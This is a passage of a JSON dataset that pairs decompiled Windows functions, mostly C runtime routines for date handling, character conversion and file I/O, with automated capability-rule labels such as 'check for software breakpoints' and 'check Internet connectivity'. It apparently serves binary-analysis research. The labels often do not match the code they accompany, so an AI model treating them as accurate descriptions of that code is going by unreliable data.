pcVar5 + 1) {\n                }\n                if (*pcVar5 == ':') {\n                    pcVar5 = pcVar5 + 1;\n                    iVar4 = fcn.0041d5fb(pcVar5);\n                    *0x444920 = *0x444920 + iVar4;\n                    for (; ('/' < *pcVar5 && (*pcVar5 < ':')); pcVar5 = pcVar5 + 1) {\n                    }\n                }\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                *0x444920 = -*0x444920;\n            }\n            *0x444924 = *pcVar5;\n            if (*0x444924 == 0) {\n                **0x4449b4 = 0;\n            }\n            else {\n                fcn.00424590(*0x4449b4, pcVar5, 3);\n                (*0x4449b4)[3] = 0;\n            }\n            goto code_r0x0042352c;\n        }\n    }\ncode_r0x0042348e:\n    fcn.0041b84a(unaff_EBP + -0x10, 0xffffffff);\ncode_r0x0042352c:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 1632
    },
    "00423532": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00423532(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = arg_10h % 4;\n    if (arg_ch == 1) {\n        if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n            iVar4 = *(in_EAX * 4 + 0x4449cc);\n        }\n        else {\n            iVar4 = *(in_EAX * 4 + 0x444a00);\n        }\n        iVar5 = iVar4 + 1;\n        iVar3 = (arg_10h * 0x16d + -0x63db + (arg_10h + -1) / 4 + iVar5 + ((arg_10h + 299) / 400 - (arg_10h + -1) / 100)\n                ) % 7;\n        iVar1 = (arg_14h * 7 - iVar3) + arg_18h;\n        if (iVar3 <= arg_18h) {\n            iVar5 = iVar4 + -6;\n        }\n        iVar5 = iVar5 + iVar1;\n        if (arg_14h == 5) {\n            if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n                iVar1 = *(in_EAX * 4 + 0x4449d0);\n            }\n            else {\n                iVar1 = *(in_EAX * 4 + 0x444a04);\n            }\n            if (iVar1 < iVar5) {\n                iVar5 = iVar5 + -7;\n            }\n        }\n    }\n    else {\n        if (((iVar2 == 0) && (iVar1 = arg_10h / 100,  arg_10h % 100 != 0)) ||\n           (iVar1 = (arg_10h + 0x76c) / 400,  (arg_10h + 0x76c) % 400 == 0)) {\n            iVar5 = *(in_EAX * 4 + 0x4449cc);\n        }\n        else {\n            iVar5 = *(in_EAX * 4 + 0x444a00);\n        }\n        iVar5 = iVar5 + arg_1ch;\n    }\n    iVar2 = (in_ECX * 0x3c + arg_20h) * 0x3c;\n    if (arg_8h == 1) {\n        *0x4449c0 = (iVar2 + arg_24h) * 1000 + arg_28h;\n        *0x4449b8 = arg_10h;\n        *0x4449bc = iVar5;\n    }\n    else {\n        *0x4449cc = (iVar2 + *0x444928 + arg_24h) * 1000 + arg_28h;\n        if (*0x4449cc < 0) {\n            *0x4449cc = *0x4449cc + 86400000;\n            *0x4449c8 = iVar5 + -1;\n        }\n        else {\n            iVar1 = 86400000;\n            *0x4449c8 = iVar5;\n            if (86399999 < *0x4449cc) {\n                *0x4449cc = *0x4449cc + -86400000;\n                *0x4449c8 = iVar5 + 1;\n            }\n        }\n        *0x4449c4 = arg_10h;\n    }\n    return iVar1;\n}\n",
        "token_count": 943
    },
    "00423a83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.00423a83(uint noname_0, uint noname_1, uint lpMultiByteStr, uint arg_14h_2, uint arg_8h, uint arg_ch, uint noname_6\n            , uint arg_14h)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uchar *arg_ch_00;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    uint CodePage;\n    uint var_4h;\n    uint var_48h_2;\n    uint var_54h;\n    uint cbMultiByte;\n    uint var_3ch_2;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x38;\n    var_4h_2 = 0x43bd48;\n    var_18h = 0x423a8f;\n    fcn.0041cd84();\n    *(unaff_EBP + -0x1c) = *0x444220;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    puVar1 = **(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x40) = puVar1;\n    *(unaff_EBP + -0x3c) = 0;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCPInfo;\n    if (*(unaff_EBP + 8) == *(unaff_EBP + 0xc)) {\n        arg_8h_00 = *(unaff_EBP + -0x48);\n    }\n    else {\n        var_18h = unaff_EBP + -0x30;\n        var_1ch = *(unaff_EBP + 8);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n        if ((((iVar3 != 0) && (*(unaff_EBP + -0x30) == 1)) &&\n            (iVar3 = (*pcVar2)(*(unaff_EBP + 0xc), unaff_EBP + -0x30),  iVar3 != 0)) && (*(unaff_EBP + -0x30) == 1)) {\n            *(unaff_EBP + -0x3c) = 1;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = *(unaff_EBP + -0x38);\n        }\n        else {\n            arg_ch_00 = puVar1;\n            if (puVar1 == 0xffffffff) {\n                iVar3 = fcn.0041c6f0(*(unaff_EBP + 0x10));\n                arg_ch_00 = iVar3 + 1;\n            }\n            *(unaff_EBP + -0x38) = arg_ch_00;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), puVar1, 0, 0);\n            *(unaff_EBP + -0x38) = arg_ch_00;\n            if (arg_ch_00 == NULL) goto code_r0x00423c3b;\n        }\n        arg_8h_00 = &fcn.00423a83::var_1ch;\n        *(unaff_EBP + -4) = 0;\n        fcn.0041bcd0();\n        *(unaff_EBP + -0x18) = &fcn.00423a83::var_1ch;\n        *(unaff_EBP + -0x48) = &fcn.00423a83::var_1ch;\n        fcn.0041cc60(&fcn.00423a83::var_1ch, 0, arg_ch_00 * 2);\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*0x10 == 0x10) {\n            arg_8h_00 = fcn.0041df24(2, arg_ch_00);\n            if (arg_8h_00 == NULL) goto code_r0x00423c3b;\n            *(unaff_EBP + -0x44) = 1;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), *(unaff_EBP + -0x40), arg_8h_00, arg_ch_00);\n        if (iVar3 != 0) {\n            if (*(unaff_EBP + 0x18) == 0) {\n                if (*(unaff_EBP + -0x3c) == 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    arg_ch_00 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                          (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, 0, 0);\n                    if (arg_ch_00 == NULL) goto code_r0x00423c2c;\n                }\n                var_1ch = 1;\n                var_18h = arg_ch_00;\n                iVar3 = fcn.0041df24(1, arg_ch_00);\n                *(unaff_EBP + -0x34) = iVar3;\n                if (iVar3 != 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                      (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, iVar3, arg_ch_00);\n                    if (iVar3 == 0) {\n                        var_18h = *(unaff_EBP + -0x34);\n                        var_1ch = 0x423c16;\n                        fcn.0041ba6d(var_18h);\n                        *(unaff_EBP + -0x34) = 0;\n                    }\n                    else if (*(unaff_EBP + -0x40) != -1) {\n                        **(unaff_EBP + 0x14) = iVar3;\n                    }\n                }\n            }\n            else {\n                var_18h = NULL;\n                var_1ch = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c)\n                                  );\n                if (iVar3 != 0) {\n                    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x18);\n                }\n            }\n        }\n    }\ncode_r0x00423c2c:\n    if (*(unaff_EBP + -0x44) != 0) {\n        var_1ch = 0x423c37;\n        var_18h = arg_8h_00;\n        fcn.0041ba6d(arg_8h_00);\n    }\ncode_r0x00423c3b:\n    *(unaff_EBP + -0x58) = 0x423c46;\n    fcn.0041c6de();\n    *(unaff_EBP + -0x58) = 0x423c4b;\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 1860
    },
    "00423cc4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00423cc4(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43bd80, 0x10);\n    if (*0x449a70 == NULL) {\n        if (*0x449638 != 1) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n            if (iVar2 != 0) {\n                *0x449a70 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"InitializeCriticalSectionAndSpinCount\");\n                if (*0x449a70 != NULL) goto code_r0x00423d10;\n            }\n        }\n        *0x449a70 = 0x423cb4;\n    }\ncode_r0x00423d10:\n    pcVar1 = *0x449a70;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    *(unaff_EBP + -0x20) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 337
    },
    "00423d4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00423d4f(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint noname_3;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint32_t var_4h;\n    \n    uVar2 = arg_ch;\n    uVar1 = arg_8h;\n    if ((*(arg_8h + 0x14) == 0) || ((*(arg_8h + 0x24) != 0 && (arg_ch < 0x80)))) {\n        if ((0x40 < arg_ch) && (arg_ch < 0x5b)) {\n            return arg_ch + 0x20;\n        }\n    }\n    else {\n        noname_3 = 1;\n        var_4h = in_ECX;\n        if (arg_ch < 0x100) {\n            if (*(arg_8h + 0x28) < 2) {\n                uVar3 = *(*(arg_8h + 0x48) + arg_ch * 2) & 1;\n            }\n            else {\n                uVar3 = fcn.00422c04(arg_8h, arg_ch, 1);\n            }\n            if (uVar3 == 0) {\n                return uVar2;\n            }\n        }\n        if ((*(*(uVar1 + 0x48) + 1 + (uVar2 >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            arg_8h = arg_8h & 0xffff0000 | uVar2 & 0xff;\n        }\n        else {\n            arg_8h = arg_8h & 0xff000000 | CONCAT11(uVar2, uVar2 >> 8);\n            noname_3 = 2;\n        }\n        iVar4 = fcn.0041e336(*(uVar1 + 0x14), 0x100, &arg_8h, noname_3, &var_4h, 3, *(uVar1 + 4), 1, unaff_EDI, \n                             unaff_ESI, unaff_EBX, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c, \n                             in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c, \n                             in_stack_00000030, in_stack_00000034);\n        if (iVar4 != 0) {\n            if (iVar4 != 1) {\n                return CONCAT11(var_4h, var_4h._1_1_);\n            }\n            return var_4h & 0xff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 839
    },
    "0042448f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0042448f(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (*0x449a78 == NULL) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"user32.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar2 == 0) || (*0x449a78 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x43be04),  *0x449a78 == NULL))\n        {\n            return 0;\n        }\n        *0x449a7c = (*pcVar1)(iVar2, 0x43bdf4);\n        *0x449a80 = (*pcVar1)(iVar2, 0x43bde0);\n        if ((*0x449638 == 2) && (*0x449a88 = (*pcVar1)(iVar2, \"GetUserObjectInformationA\"),  *0x449a88 != NULL)) {\n            *0x449a84 = (*pcVar1)(iVar2, \"GetProcessWindowStation\");\n        }\n    }\n    if ((*0x449a84 == NULL) ||\n       (((iVar2 = (**0x449a84)(),  iVar2 != 0 && (iVar2 = (**0x449a88)(iVar2, 1, &var_10h, 0xc, &var_4h),  iVar2 != 0))\n        && ((var_8h & 1) != 0)))) {\n        if (((*0x449a7c != NULL) && (iVar4 = (**0x449a7c)(),  iVar4 != 0)) && (*0x449a80 != NULL)) {\n            iVar4 = (**0x449a80)(iVar4);\n        }\n    }\n    else if (*0x449644 < 4) {\n        arg_10h = arg_10h | 0x40000;\n    }\n    else {\n        arg_10h = arg_10h | 0x200000;\n    }\n    uVar3 = (**0x449a78)(iVar4, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 560
    },
    "004246b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.004246b4(uint8_t param_1, uint32_t param_2, uint8_t param_3)\n\n{\n    if ((*(param_1 + 0x44ace1) & param_3) == 0) {\n        if (param_2 == 0) {\n            param_2 = 0;\n        }\n        else {\n            param_2 = *(*0x444910 + param_1 * 2) & param_2;\n        }\n        if (param_2 == 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 131
    },
    "004246f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004246f8(int32_t arg_8h, uint16_t *lpWideCharStr, uint8_t *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if ((arg_10h != NULL) && (arg_14h != 0)) {\n        uVar1 = *arg_10h;\n        if (uVar1 != 0) {\n            if (*(arg_8h + 0x14) == 0) {\n                if (lpWideCharStr != NULL) {\n                    *lpWideCharStr = uVar1;\n                }\n                return 1;\n            }\n            if ((*(*(arg_8h + 0x48) + 1 + uVar1 * 2) & 0x80) == 0) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(arg_8h + 4), 9, arg_10h, 1, lpWideCharStr, lpWideCharStr != NULL);\n                if (iVar2 != 0) {\n                    return 1;\n                }\n            }\n            else {\n                iVar2 = *(arg_8h + 0x28);\n                if ((((1 < iVar2) && (iVar2 <= arg_14h)) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                       (*(arg_8h + 4), 9, arg_10h, iVar2, lpWideCharStr, lpWideCharStr != NULL), \n                    iVar2 != 0)) || ((*(arg_8h + 0x28) <= arg_14h && (arg_10h[1] != 0)))) {\n                    return *(arg_8h + 0x28);\n                }\n            }\n            puVar3 = fcn.0041da34();\n            *puVar3 = 0x2a;\n            return 0xffffffff;\n        }\n        if (lpWideCharStr != NULL) {\n            *lpWideCharStr = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 479
    },
    "004248c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.004248c4(uint32_t param_1, char **param_2)\n\n{\n    char *pcVar1;\n    \n    if (param_1 != 0xffffffff) {\n        pcVar1 = param_2[3];\n        if (((pcVar1 & 1) != 0) || ((pcVar1 < '\\0' && ((pcVar1 & 2) == 0)))) {\n            if (param_2[2] == NULL) {\n                fcn.00424239(param_2);\n            }\n            if (*param_2 == param_2[2]) {\n                if (param_2[1] != NULL) {\n                    return 0xffffffff;\n                }\n                *param_2 = *param_2 + 1;\n            }\n            *param_2 = *param_2 + -1;\n            pcVar1 = *param_2;\n            if ((*(param_2 + 3) & 0x40) == 0) {\n                *pcVar1 = param_1;\n            }\n            else if (*pcVar1 != param_1) {\n                *param_2 = pcVar1 + 1;\n                return 0xffffffff;\n            }\n            param_2[1] = param_2[1] + 1;\n            param_2[3] = param_2[3] & 0xffffffef | 1;\n            return param_1 & 0xff;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 324
    },
    "00424930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00424930(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = param_2 / 0x20;\n    uVar1 = *(param_1 + iVar2 * 4) & ~(-1 << (0x1fU - param_2 % 0x20 & 0x1f));\n    while( true ) {\n        if (uVar1 != 0) {\n            return 0;\n        }\n        iVar2 = iVar2 + 1;\n        if (2 < iVar2) break;\n        uVar1 = *(param_1 + iVar2 * 4);\n    }\n    return 1;\n}\n",
        "token_count": 163
    },
    "00424a55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424a55(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_ch % 0x20;\n    iVar2 = 0;\n    var_4h = 0;\n    do {\n        uVar1 = *(arg_8h + iVar2 * 4);\n        *(arg_8h + iVar2 * 4) = uVar1 >> (uVar3 & 0x1f) | var_4h;\n        var_4h = (uVar1 & ~(-1 << (uVar3 & 0x1f))) << (0x20 - uVar3 & 0x1f);\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 3);\n    iVar2 = 2;\n    puVar4 = arg_8h + (2 - arg_ch / 0x20) * 4;\n    do {\n        if (iVar2 < arg_ch / 0x20) {\n            *(arg_8h + iVar2 * 4) = 0;\n        }\n        else {\n            *(arg_8h + iVar2 * 4) = *puVar4;\n        }\n        iVar2 = iVar2 + -1;\n        puVar4 = puVar4 + -1;\n    } while (-1 < iVar2);\n    return;\n}\n",
        "token_count": 352
    },
    "00425353": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00425353(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *extraout_ECX;\n    code *arg_8h_00;\n    int32_t unaff_EBP;\n    code **ppcVar4;\n    code *pcVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43bf40, 0x20);\n    *(unaff_EBP + -0x1c) = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == 2) {\n        ppcVar4 = 0x449ae0;\n        pcVar5 = *0x449ae0;\ncode_r0x004253e0:\n        *(unaff_EBP + -0x1c) = 1;\n        iVar1 = *(unaff_EBP + -0x24);\n    }\n    else {\n        if (((iVar1 != 4) && (iVar1 != 8)) && (iVar1 != 0xb)) {\n            if (iVar1 == 0xf) {\n                ppcVar4 = 0x449aec;\n                pcVar5 = *0x449aec;\n            }\n            else if (iVar1 == 0x15) {\n                ppcVar4 = 0x449ae4;\n                pcVar5 = *0x449ae4;\n            }\n            else {\n                if (iVar1 != 0x16) goto code_r0x004254c6;\n                ppcVar4 = 0x449ae8;\n                pcVar5 = *0x449ae8;\n            }\n            goto code_r0x004253e0;\n        }\n        iVar1 = fcn.0041e005();\n        *(unaff_EBP + -0x24) = iVar1;\n        iVar2 = fcn.00425325();\n        ppcVar4 = iVar2 + 8;\n        pcVar5 = *ppcVar4;\n    }\n    arg_8h_00 = NULL;\n    *(unaff_EBP + -0x20) = pcVar5;\n    if (pcVar5 == 0x1) goto code_r0x004254c6;\n    if (pcVar5 == NULL) {\n        fcn.0041cbfc(3);\n        arg_8h_00 = extraout_ECX;\n    }\n    if (*(unaff_EBP + -0x1c) != arg_8h_00) {\n        fcn.0041f23f(arg_8h_00);\n        arg_8h_00 = NULL;\n    }\n    *(unaff_EBP + -4) = arg_8h_00;\n    iVar2 = *(unaff_EBP + 8);\n    if (((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) {\n        *(unaff_EBP + -0x2c) = *(iVar1 + 0x58);\n        *(iVar1 + 0x58) = arg_8h_00;\n        if (iVar2 == 8) {\n            *(unaff_EBP + -0x30) = *(iVar1 + 0x5c);\n            *(iVar1 + 0x5c) = 0x8c;\n            goto code_r0x0042543f;\n        }\ncode_r0x0042546b:\n        *ppcVar4 = arg_8h_00;\n    }\n    else {\ncode_r0x0042543f:\n        iVar3 = *0x444710;\n        if (iVar2 != 8) goto code_r0x0042546b;\n        for (; *(unaff_EBP + -0x28) = iVar3,  iVar3 < *0x444714 + *0x444710; iVar3 = iVar3 + 1) {\n            *(*(iVar1 + 0x54) + 8 + iVar3 * 0xc) = arg_8h_00;\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042548e();\n    if (*(unaff_EBP + 8) == 8) {\n        (*pcVar5)(8, *(iVar1 + 0x5c));\n    }\n    else {\n        (*pcVar5)(*(unaff_EBP + 8));\n    }\n    iVar2 = *(unaff_EBP + 8);\n    if ((((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) && (*(iVar1 + 0x58) = *(unaff_EBP + -0x2c),  iVar2 == 8)) {\n        *(iVar1 + 0x5c) = *(unaff_EBP + -0x30);\n    }\ncode_r0x004254c6:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 1148
    },
    "004254cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004254cc(uint32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (param_1 < *0x44ab84) {\n        piVar1 = (param_1 >> 5) * 4 + 0x44aba0;\n        iVar4 = (param_1 & 0x1f) * 0x24;\n        piVar2 = *piVar1 + iVar4;\n        if (((*(piVar2 + 1) & 1) != 0) && (*piVar2 != -1)) {\n            if (*0x444210 == 1) {\n                if (param_1 == 0) {\n                    uVar5 = 0xfffffff6;\n                }\n                else if (param_1 == 1) {\n                    uVar5 = 0xfffffff5;\n                }\n                else {\n                    if (param_1 != 2) goto code_r0x00425528;\n                    uVar5 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar5, 0);\n            }\ncode_r0x00425528:\n            *(iVar4 + *piVar1) = 0xffffffff;\n            return 0;\n        }\n    }\n    puVar3 = fcn.0041da34();\n    *puVar3 = 9;\n    puVar3 = fcn.0041da3d();\n    *puVar3 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 359
    },
    "0042576c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0042576c(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_10h;\n    \n    uVar2 = 0;\n    if (((param_1[3] & 3) == 2) && ((param_1[3] & 0x108U) != 0)) {\n        arg_10h = *param_1 - param_1[2];\n        if (0 < arg_10h) {\n            iVar1 = fcn.0042418e(param_1[4], param_1[2], arg_10h);\n            if (iVar1 == arg_10h) {\n                if (param_1[3] < '\\0') {\n                    param_1[3] = param_1[3] & 0xfffffffd;\n                }\n            }\n            else {\n                param_1[3] = param_1[3] | 0x20;\n                uVar2 = 0xffffffff;\n            }\n        }\n    }\n    param_1[1] = 0;\n    *param_1 = param_1[2];\n    return uVar2;\n}\n",
        "token_count": 260
    },
    "004258d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBuffer\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004258d5(uint32_t arg_8h, char *arg_ch, char *nNumberOfBytesToRead)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    int32_t lpNumberOfBytesRead;\n    char *var_8h;\n    uint lpBuffer;\n    \n    var_8h = NULL;\n    if (nNumberOfBytesToRead != NULL) {\n        piVar1 = (arg_8h >> 5) * 4 + 0x44aba0;\n        iVar9 = (arg_8h & 0x1f) * 0x24;\n        uVar3 = *(*piVar1 + iVar9 + 4);\n        if ((uVar3 & 2) == 0) {\n            pcVar8 = arg_ch;\n            if (((uVar3 & 0x48) != 0) && (*(*piVar1 + iVar9 + 5) != '\\n')) {\n                nNumberOfBytesToRead = nNumberOfBytesToRead + -1;\n                *arg_ch = *(*piVar1 + 5 + iVar9);\n                pcVar8 = arg_ch + 1;\n                var_8h = 0x1;\n                *(*piVar1 + 5 + iVar9) = 10;\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)\n                              (*(*piVar1 + iVar9), pcVar8, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n            if (iVar6 == 0) {\n                iVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar9 == 5) {\n                    puVar7 = 